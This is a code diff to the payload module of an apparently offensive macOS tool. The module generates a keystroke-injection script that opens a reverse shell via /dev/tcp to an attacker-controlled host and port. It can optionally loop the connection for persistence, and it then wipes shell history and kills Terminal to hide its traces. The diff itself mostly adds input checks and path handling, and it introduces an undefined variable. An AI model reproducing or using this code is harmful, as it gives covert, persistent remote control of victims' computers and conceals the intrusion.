@@ -30,39 +30,51 @@ class payload:
 	def run(self,server):
 		while 1:
 			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			while shell == "":
+			    shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
 				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
-				shell_clean = "history -wc;killall Terminal"
 				break
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		while path == "":
+		    path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
 		w = os.environ['OLDPWD']
-                os.chdir(w)
+            	os.chdir(w)
 		if os.path.isdir(path):
 		    if os.path.exists(path):
-			if path[:-1] == "/":
-			    payload_save_path = path + "payload.txt"
-			else:
-			    payload_save_path = path + "/payload.txt"
+			if path[-1:] == "/":
+                             payload_save_path = path + "payload.txt"
+                        else:
+                             payload_save_path = path + "/payload.txt"
 		    else:
-			h.info_error("Local directory: "+path+": does not exist!")
+			h.info_error("Local directory: "+dest+": does not exist!")
+			g = os.environ['HOME']
+            		os.chdir(g + "/mouse")
 			exit
 		else:
 		    direct = os.path.split(path)[0]
-		    if os.path.exists(direct):
-			if os.path.isdir(direct):
-		            payload_save_path = path
-			else:
-			    h.info_error("Error: "+direct+": not a directory!")
-			    exit
+		    if direct != "":
+		        if os.path.exists(direct):
+		            if os.path.isdir(direct):
+		                payload_save_path = path
+		            else:
+			        h.info_error("Error: "+direct+": not a directory!")
+				g = os.environ['HOME']
+            			os.chdir(g + "/mouse")
+			        exit
+		        else:
+		            h.info_error("Local directory: "+direct+": does not exist!")
+			    g = os.environ['HOME']
+            		    os.chdir(g + "/mouse")
+		            exit
 		    else:
-		        h.info_error("Local directory: "+direct+": does not exist!")
-		        exit
+			payload_save_path = path
+			
 		payload = """\
 DELAY 500
 COMMAND SPACE
@@ -81,4 +93,4 @@ DELAY 500"""
 		f.close()
 		h.info_success("Saved to " + payload_save_path + "!")
 		g = os.environ['HOME']
-                os.chdir(g + "/mouse")
+            	os.chdir(g + "/mouse")
